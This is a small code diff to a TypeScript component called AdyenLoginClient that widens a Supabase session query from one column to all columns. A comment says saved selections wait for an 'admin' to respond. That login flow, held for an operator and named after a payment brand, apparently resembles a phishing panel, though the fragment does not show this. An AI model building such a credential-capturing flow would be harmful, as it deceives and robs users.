@@ -18,7 +18,7 @@ export function AdyenLoginClient({ sessionId }: Props) {
     if (!supabase || !sessionId) return;
     setSaving(true);
 
-    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
+    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
     const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
 
     // We just save the selection and move to "wait" so admin can respond
